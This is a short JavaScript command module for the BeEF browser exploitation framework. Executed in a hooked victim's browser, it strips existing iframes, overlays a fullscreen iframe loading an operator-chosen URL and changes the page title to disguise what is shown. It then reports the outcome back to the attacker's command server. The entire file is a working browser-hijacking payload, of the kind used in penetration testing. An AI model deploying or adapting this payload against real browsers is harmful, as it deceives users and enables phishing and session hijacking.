beef.execute(function() {

	var result = 'Iframe successfully created!';
	var title = '<%= @iframe_title %>';
	var iframe_src = '<%= @iframe_src %>';
	var sent = false;

	$j("iframe").remove();
	
	beef.dom.createIframe('fullscreen', 'get', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result); } });

	setTimeout(function() { 
		if(!sent) {
			result = 'Iframe failed to load, timeout';
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
			document.title = iframe_src + " is not available";
			sent = true;
		}
	}, <%= @iframe_timeout %>);

});